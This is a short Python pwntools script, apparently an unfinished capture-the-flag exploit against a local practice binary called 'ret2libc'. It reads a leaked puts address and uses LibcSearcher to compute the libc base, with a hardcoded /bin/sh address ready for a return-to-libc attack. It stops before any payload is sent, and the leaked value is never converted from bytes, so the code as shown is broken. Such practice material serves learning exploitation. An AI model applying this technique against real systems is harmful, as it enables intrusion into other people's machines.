from pwn import *
from LibcSearcher import *

pro=process('./ret2libc')
elf=ELF('./ret2libc')

binsh=0x0804A02C

pro.recvuntil('is ')
pro.recvuntil('is ')
puts_fun=pro.recvuntil('\n',drop=True)

libc=LibcSearcher('puts',puts_fun)
libcbase=puts_fun-libc.dump('puts')

